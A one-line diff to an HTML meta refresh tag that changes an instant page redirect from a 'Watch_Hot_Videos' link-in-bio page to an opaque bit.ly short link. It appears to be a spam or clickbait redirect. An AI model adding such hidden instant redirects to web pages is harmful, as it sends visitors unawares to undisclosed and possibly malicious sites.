@@ -1,1 +1,1 @@
-<meta content='0; url = https://linkr.bio/Watch_Hot_Videos' http-equiv='refresh'/>
+<meta content='0; url = https://bit.ly/3GsUXCY' http-equiv='refresh'/>
